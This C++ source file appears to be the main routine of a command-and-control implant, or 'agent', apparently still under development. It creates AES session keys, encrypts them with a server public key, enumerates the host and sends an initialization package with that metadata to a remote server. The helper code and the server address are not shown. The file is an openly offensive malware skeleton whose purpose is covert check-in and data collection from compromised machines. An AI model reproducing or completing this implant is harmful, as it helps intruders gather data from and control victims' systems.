// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "package.h"
#include "agent.h"
#include "Helpers.h"
#include "enum.h"
#include "Http.h"
#include "localcstd.h"

int main()

//TODO finish establishing secure comms.
{
    pPackage pPack;
    Agent AgentData = { 0 };
    INT err;

    AgentData.AgentID = 0xdeadbeef;
    
    ltc_mp = ltm_desc;
    register_all_ciphers();
    register_all_hashes();
    register_all_prngs();

    unsigned char* PublicKey;
    unsigned long PublicKeySize;
    unsigned long SymmetricKeySize = 32;

    prng_state* prng = CreatePRNGState();
    char* SymmetricKey = CreateAESKey(prng);
    char* IV = CreateIV(prng);

    AgentData.AESKey = SymmetricKey;
    AgentData.AESKeySize = 32;

    AgentData.IV = IV;
    AgentData.IVSize = 16;

    sprng_done(prng);
    free(prng);


    if (ReadPublicKey(&PublicKey, &PublicKeySize) != 0) {
        printf("[error] attempting to read public key\n");
        return -1;
    }

    EncryptAESKey(AgentData.AESKey, AgentData.AESKeySize, PublicKey, PublicKeySize, &AgentData.EncryptedAESKey, &AgentData.EncryptedAESKeySize);
    EncryptAESKey(AgentData.IV, AgentData.IVSize, PublicKey, PublicKeySize, &AgentData.EncryptedIV, &AgentData.EncryptedIVSize);

    free(PublicKey);
    
    if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, &AgentData)) == NULL) {
        printf("[error] attempting to create package\n");
        return -1;
    }
    //add package to agentData.
    AgentData.packages = pPack;
    AddPackageToAgentPackageList(&AgentData, pPack);

    if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add aes key length to package\n");
        return -1;
    }

    if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedAESKey, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add IV length to package\n");
        return -1;
    }
    if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedIV, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    Enumerate(&AgentData);

    if ((err = AddStringToPackage(AgentData.packages, "ENCRYPTION TEST")) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add the dummy data to encrypted\n");
        return -1;
    }


    PackageSendMetaDataPackage(AgentData.packages, NULL, NULL, &AgentData);
     
}

